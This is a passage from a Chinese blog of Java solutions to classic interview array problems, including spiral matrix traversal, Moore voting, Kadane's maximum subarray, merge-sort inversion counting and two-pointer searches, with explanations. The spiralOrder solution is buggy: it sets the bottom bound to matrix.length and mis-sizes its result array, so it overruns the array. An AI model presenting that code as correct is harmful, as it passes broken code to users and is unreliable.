class="hljs-number">0</span>;i&lt;length;i++)&#123;<br>        <span class="hljs-keyword">if</span> ((array[i] &amp; <span class="hljs-number">1</span>)==<span class="hljs-number">1</span>)&#123;<br>            array1.add(array[i]);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            array2.add(array[i]);<br>        &#125;<br>    &#125;<br>    array1.addAll(array2);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i&lt;length;i++)&#123;<br>        array[i] = (<span class="hljs-keyword">int</span>)array1.get(i);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样做时间复杂度是O(n)，空间复杂度为O(n)。</p><p>也可以使用双指针</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] exchange(<span class="hljs-keyword">int</span>[] nums) &#123;<br>        <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>,j = nums.length - <span class="hljs-number">1</span>,tmp;<br>        <span class="hljs-keyword">while</span>(i &lt; j) &#123;<br>            <span class="hljs-keyword">while</span>(i &lt; j &amp;&amp; (nums[i] &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">1</span>) i++;<br>            <span class="hljs-keyword">while</span>(i &lt; j &amp;&amp; (nums[j] &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>) j--;<br>            tmp = nums[i];<br>            nums[i] = nums[j];<br>            nums[j] = tmp;<br>        &#125;<br>        <span class="hljs-keyword">return</span> nums;<br>    &#125;<br></code></pre></td></tr></table></figure><p>这样做的时间复杂度是O(n)，空间复杂度为O(1)。</p><h2 id="1-6-顺时针打印矩阵"><a href="#1-6-顺时针打印矩阵" class="headerlink" title="1.6 顺时针打印矩阵"></a>1.6 顺时针打印矩阵</h2><p>题目：输入一个矩阵，按照从外向里以顺时针的顺序依次打印出每一个数字。</p><p>示例 1：</p><p>输入：matrix = [[1,2,3],[4,5,6],[7,8,9]]<br>输出：[1,2,3,6,9,8,7,4,5]</p><p>示例 2：</p><p>输入：matrix = [[1,2,3,4],[5,6,7,8],[9,10,11,12]]<br>输出：[1,2,3,4,8,12,11,10,9,5,6,7]</p><p>限制：</p><p>0 &lt;= matrix.length &lt;= 100<br>0 &lt;= matrix[i].length &lt;= 100</p><p>算法流程：</p><ul><li>空值处理： 当 matrix 为空时，直接返回空列表 [] 即可。</li><li>初始化： 矩阵 左、右、上、下 四个边界 l , r , t , b ，用于打印的结果列表 res 。</li><li>循环打印： “从左向右、从上向下、从右向左、从下向上” 四个方向循环，每个方向打印中做以下三件事 （各方向的具体信息见下表） ；<ul><li>根据边界打印，即将元素按顺序添加至列表 res 尾部；</li><li>边界向内收缩 11 （代表已被打印）；</li><li>判断是否打印完毕（边界是否相遇），若打印完毕则跳出。</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] spiralOrder(<span class="hljs-keyword">int</span>[][] matrix) &#123;<br>        <span class="hljs-keyword">if</span> (matrix.length == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">0</span>];<br>        &#125;<br>        <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>, right = matrix[<span class="hljs-number">0</span>].length - <span class="hljs-number">1</span>, top = <span class="hljs-number">0</span>, below = matrix.length,x=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">int</span>[] res = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[(right+<span class="hljs-number">1</span>)*(below+<span class="hljs-number">1</span>)];<br>        <span class="hljs-keyword">while</span> (<span class="hljs-keyword">true</span>) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = left;i &lt;= right; i++) &#123;<br>                res[x++] = matrix[top][i];<br>            &#125;<br>            <span class="hljs-keyword">if</span> (++top &gt; below) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = top;i &lt;= below; i++) &#123;<br>                res[x++] = matrix[i][right];<br>            &#125;<br>            <span class="hljs-keyword">if</span> (--right &lt; left) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = right;i &gt;= left; i--) &#123;<br>                res[x++] = matrix[below][i];<br>            &#125;<br>            <span class="hljs-keyword">if</span> (--below &lt; top) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = below;i &gt;= top; i--) &#123;<br>                res[x++] = matrix[i][left];<br>            &#125;<br>            <span class="hljs-keyword">if</span> (++left &gt; right) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="1-7-数组中出现次数超过一半的数字"><a href="#1-7-数组中出现次数超过一半的数字" class="headerlink" title="1.7  数组中出现次数超过一半的数字"></a>1.7  数组中出现次数超过一半的数字</h2><p>题目：数组中有一个数字出现的次数超过数组长度的一半，请找出这个数字。你可以假设数组是非空的，并且给定的数组总是存在多数元素。</p><font color=red>摩尔投票法</font><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//x众数,votes票数</span><br><span class="hljs-keyword">int</span> x = <span class="hljs-number">0</span>, votes = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> num : nums)&#123;<br>    <span class="hljs-keyword">if</span> (votes == <span class="hljs-number">0</span>)&#123;x = num;&#125;<br>    votes += num == x ? <span class="hljs-number">1</span> : -<span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">return</span> x;<br></code></pre></td></tr></table></figure><h2 id="1-8-连续子数组的最大和"><a href="#1-8-连续子数组的最大和" class="headerlink" title="1.8 连续子数组的最大和"></a>1.8 连续子数组的最大和</h2><p>​    题目：输入一个整型数组，数组中的一个或连续多个整数组成一个子数组。求所有子数组的和的最大值。要求时间复杂度为O(n)。</p><p>​    使用动态规划</p><ul><li>状态定义： 设动态规划列表 $dp$ ，$dp[i]$ 代表以元素$ nums[i] $为结尾的连续子数组最大和。<ul><li>为何定义最大和$ dp[i]$ 中必须包含元素 $nums[i]$ ：保证$dp[i] $递推到 $dp[i+1]$ 的正确性；如果不包含 $nums[i]$ ，递推时则不满足题目的 <strong>连续子数组</strong> 要求。</li></ul></li><li>转移方程：若 $dp[i−1]≤0$ ，说明$ dp[i−1] $对$ dp[i] $产生负贡献，即 $dp[i−1]+nums[i]$ 还不如$nums[i]$ 本身大。</li><li>初始状态： $dp[0]=nums[0]$，即以$nums[0]$ 结尾的连续子数组最大和为$ nums[0]$ 。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">maxSubArray</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>     <span class="hljs-comment">//用nums本身做dp数组。maxSub记录值,初始状态dp[0] = nums[0] </span><br>    <span class="hljs-keyword">int</span> res = nums[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; nums.length; i++)&#123;<br>        <span class="hljs-comment">//状态转移方程</span><br>        nums[i] += Math.max(<span class="hljs-number">0</span>,nums[i-<span class="hljs-number">1</span>]);<br>        res = Math.max(res,nums[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-9-数组中的逆序对"><a href="#1-9-数组中的逆序对" class="headerlink" title="1.9 数组中的逆序对"></a>1.9 数组中的逆序对</h2><p>题目：在数组中的两个数字，如果前面一个数字大于后面的数字，则这两个数字组成一个逆序对。输入一个数组，求出这个数组中的逆序对的总数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">reversePairs</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> len = nums.length;<br><br>    <span class="hljs-keyword">if</span> (len &lt; <span class="hljs-number">2</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">int</span>[] copy = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[len];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++)&#123;<br>        copy[i] = nums[i];<br>    &#125;<br><br>    <span class="hljs-keyword">int</span>[] temp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[len];<br>    <span class="hljs-keyword">return</span> reversePairs(copy, <span class="hljs-number">0</span>, len-<span class="hljs-number">1</span>, temp);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">reversePairs</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> left, <span class="hljs-keyword">int</span> right, <span class="hljs-keyword">int</span>[] temp)</span></span>&#123;<br>    <span class="hljs-keyword">if</span> (left == right)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">int</span> mid = left + (right-left) / <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">int</span> leftPairs = reversePairs(nums, left, mid, temp);<br>    <span class="hljs-keyword">int</span> rightPairs = reversePairs(nums, mid+<span class="hljs-number">1</span>, right, temp);<br><br>    <span class="hljs-keyword">if</span> (nums[mid] &lt;= nums[mid + <span class="hljs-number">1</span>])&#123;<br>        <span class="hljs-keyword">return</span> leftPairs + rightPairs;<br>    &#125;<br><br>    <span class="hljs-keyword">int</span> crossPairs = mergeAndCount(nums,left,mid,right,temp);<br>    <span class="hljs-keyword">return</span> leftPairs + rightPairs + crossPairs;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-title">mergeAndCount</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> left, <span class="hljs-keyword">int</span> mid , <span class="hljs-keyword">int</span> right, <span class="hljs-keyword">int</span>[] temp)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = left; i &lt;= right ; i++) &#123;<br>        temp[i] = nums[i];<br>    &#125;<br>    <span class="hljs-keyword">int</span> i = left;<br>    <span class="hljs-keyword">int</span> j = mid + <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">int</span> count = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = left; k &lt;= right ; k++) &#123;<br><br>        <span class="hljs-keyword">if</span> (i == mid + <span class="hljs-number">1</span>)&#123;<br>            nums[k] = temp[j];<br>            j++;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (j == right + <span class="hljs-number">1</span>)&#123;<br>            nums[k] = temp[i];<br>            i++;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (temp[i] &lt;= temp[j])&#123;<br>            nums[k] = temp[i];<br>            i++;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            nums[k] = temp[j];<br>            j++;<br>            count += (mid - i + <span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> count;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-10-在排序数组中查找数字"><a href="#1-10-在排序数组中查找数字" class="headerlink" title="1.10 在排序数组中查找数字"></a>1.10 在排序数组中查找数字</h2><p>​    题目：统计一个数字在排序数组中出现的次数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">search</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> helper(nums,target) - helper(nums,target - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-title">helper</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> tar)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>, j = nums.length - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (i &lt;= j)&#123;<br>        <span class="hljs-keyword">int</span> m = i + (j - i) / <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span> (nums[m] &lt;= tar)&#123;<br>            i = m + <span class="hljs-number">1</span>;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            j = m - <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> i;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-11-0～n-1中缺失的数字"><a href="#1-11-0～n-1中缺失的数字" class="headerlink" title="1.11 0～n-1中缺失的数字"></a>1.11 0～n-1中缺失的数字</h2><p>题目：一个长度为n-1的递增排序数组中的所有数字都是唯一的，并且每个数字都在范围0～n-1之内。在范围0～n-1内的n个数字中有且只有一个数字不在该数组中，请找出这个数字。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">missingNumber</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>     <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>, j = nums.length - <span class="hljs-number">1</span>;<br>     <span class="hljs-keyword">while</span> (i &lt;= j)&#123;<br>         <span class="hljs-keyword">int</span> m = i + (j - i) / <span class="hljs-number">2</span>;<br>         <span class="hljs-keyword">if</span> (nums[m] == m)&#123;<br>             i = m + <span class="hljs-number">1</span>;<br>         &#125;<span class="hljs-keyword">else</span> &#123;<br>             j = m - <span class="hljs-number">1</span>;<br>         &#125;<br>     &#125;<br><br>     <span class="hljs-keyword">return</span> i;<br>&#125;<br></code></pre></td></tr></table></figure><p>or</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">missingNumber</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>,right = nums.length,mid;<br>        <span class="hljs-keyword">while</span> (left &lt; right) &#123;<br>            mid = left + (right-left)/<span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">if</span> (nums[mid] == mid) &#123;<br>                left = mid + <span class="hljs-number">1</span>;<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(nums[mid] != mid)&#123;<br>                right = mid;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> left;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="1-12-和为s的两个数字"><a href="#1-12-和为s的两个数字" class="headerlink" title="1.12 和为s的两个数字"></a>1.12 和为s的两个数字</h2><p>​    题目：输入一个递增排序的数组和一个数字s，在数组中查找两个数，使得它们的和正好是s。如果有多对数字的和等于s，则输出任意一对即可。</p><font color='red'>对撞指针（左右指针）</font><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] twoSum(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target) &#123;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>, j = nums.length - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (i &lt; j)&#123;<br>        <span class="hljs-keyword">int</span> s = nums[i] + nums[j];<br>        <span class="hljs-keyword">if</span> (s == target)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;nums[i], nums[j]&#125;;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (s &lt; target)&#123;<br>            i++;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            j--;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">0</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>正确性证明：</p><blockquote><p>记每个状态为 $S(i, j)$ ，即 $S(i, j) = nums[i] + nums[j]$。假设 $S(i,j)&lt;target$ ，则执行 $i = i + 1$ ，即状态切换至 $S(i + 1, j)$。</p></blockquote><ul><li><p>状态 $S(i, j)$切换至 $S(i + 1, j)$，则会消去一行元素，相当于 消去了状态集合$ {S(i, i + 1), S(i, i + 2), …, S(i, j - 2), S(i, j - 1), S(i, j) }$ 。（由于双指针都是向中间收缩，因此这些状态之后不可能再遇到）。</p></li><li><p>由于$nums$ 是排序数组，因此这些 消去的状态 都一定满足 $S(i,j)&lt;target$ ，即这些状态都 不是解 。</p></li><li><p>结论： 以上分析已证明 “每次指针 $i$ 的移动操作，都不会导致解的丢失” ，即指针 i 的移动操作是 安全的 ；同理，对于指针 $j$ 可得出同样推论；因此，此双指针法是正确的。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/25bb748e0fc6f829056caf07716b96d02121625350afc012f2c351da73945f65-Picture1.png" style="zoom:33%;" /></p></li></ul><h2 id="1-13-扑克牌中的顺子"><a href="#1-13-扑克牌中的顺子" class="headerlink" title="1.13 扑克牌中的顺子"></a>1.13 扑克牌中的顺子</h2><p>​    题目：从扑克牌中随机抽5张牌，判断是不是一个顺子，即这5张牌是不是连续的。2～10为数字本身，A为1，J为11，Q为12，K为13，而大、小王为 0 ，可以看成任意数字。A 不能视为 14。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isStraight</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>    HashSet&lt;Integer&gt; repeat = <span class="hljs-keyword">new</span> HashSet&lt;&gt;();<br>    <span class="hljs-keyword">int</span> max = <span class="hljs-number">0</span>, min = <span class="hljs-number">14</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> num : nums) &#123;<br>        <span class="hljs-keyword">if</span> (num == <span class="hljs-number">0</span>)&#123;<span class="hljs-keyword">continue</span>;&#125;<br>        max = Math.max(max,num);<br>        min = Math.min(min,num);<br>        <span class="hljs-keyword">if</span> (repeat.contains(num))&#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;&#125;<br>        repeat.add(num);<br>    &#125;<br>    <span class="hljs-keyword">return</span> max - min &lt; <span class="hljs-number">5</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-14-构建乘积数组"><a href="#1-14-构建乘积数组" class="headerlink" title="1.14 构建乘积数组"></a>1.14 构建乘积数组</h2><p>​    题目：给定一个数组 A[0,1,…,n-1]，请构建一个数组 B[0,1,…,n-1]，其中 B 中的元素 B[i]=A[0]×A[1]×…×A[i-1]×A[i+1]×…×A[n-1]。不能使用除法。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/6056c7a5009cb7a4674aab28505e598c502a7f7c60c45b9f19a8a64f31304745-Picture1.png" alt="Picture1.png" style="zoom: 33%;" /></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] constructArr(<span class="hljs-keyword">int</span>[] a) &#123;<br>    <span class="hljs-keyword">if</span> (a.length == <span class="hljs-number">0</span>)&#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">0</span>];&#125;<br>    <span class="hljs-keyword">int</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[a.length];<br>    b[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">int</span> tmp = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; a.length; i++)&#123;<br>        b[i] = b[i-<span class="hljs-number">1</span>] * a[i-<span class="hljs-number">1</span>];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = a.length - <span class="hljs-number">2</span>; i &gt;= <span class="hljs-number">0</span>; i--)&#123;<br>        <span class="hljs-comment">//tmp记录右边部分乘积</span><br>        tmp *= a[i+<span class="hljs-number">1</span>];<br>        b[i] *= tmp;<br>    &#125;<br>    <span class="hljs-keyword">return</span> b;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-15-把数组排成最小的数"><a href="#1-15-把数组排成最小的数" class="headerlink" title="1.15 把数组排成最小的数"></a>1.15 把数组排成最小的数</h2><p>​    题目：输入一个非负整数数组，把数组里所有数字拼接起来排成一个数，打印能拼接出的所有数字中最小的一个。</p><p>快速排序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">minNumber</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>     String[] strs = <span class="hljs-keyword">new</span> String[nums.length];<br>     <span class="hljs-comment">//整形数组转成字符串数组</span><br>     <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.length; i++)&#123;<br>         strs[i] = String.valueOf(nums[i]);<br>     &#125;<br>     <span class="hljs-comment">//排序</span><br>     fastSort(strs,<span class="hljs-number">0</span>,strs.length - <span class="hljs-number">1</span>);<br>     StringBuilder res = <span class="hljs-keyword">new</span> StringBuilder();<br>     <span class="hljs-comment">//字符串数组转成字符串</span><br>     <span class="hljs-keyword">for</span> (String s : strs)&#123;<br>         res.append(s);<br>     &#125;<br>     <span class="hljs-keyword">return</span> res.toString();<br><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">fastSort</span><span class="hljs-params">(String[] strs,<span class="hljs-keyword">int</span> l,<span class="hljs-keyword">int</span> r)</span></span>&#123;<br>     <span class="hljs-keyword">if</span> (l &gt;= r)&#123;<span class="hljs-keyword">return</span>;&#125;<br>     <span class="hljs-keyword">int</span> i = l,j = r;<br>     String tmp = strs[i];<br>     <span class="hljs-keyword">while</span> (i &lt; j)&#123;<br>         <span class="hljs-keyword">while</span> ((strs[j] + strs[l]).compareTo(strs[l] + strs[j]) &gt;= <span class="hljs-number">0</span> &amp;&amp; i &lt; j)&#123;j--;&#125;<br>         <span class="hljs-keyword">while</span> ((strs[i] + strs[l]).compareTo(strs[l] + strs[i]) &lt;= <span class="hljs-number">0</span> &amp;&amp; i &lt; j)&#123;i++;&#125;<br>         tmp = strs[i];<br>         strs[i] = strs[j];<br>         strs[j] = tmp;<br>     &#125;<br>     strs[i] = strs[l];<br>     strs[l] = tmp;<br>     fastSort(strs,l,i-<span class="hljs-number">1</span>);<br>     fastSort(strs,i+<span class="hljs-number">1</span>,r);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>内置函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 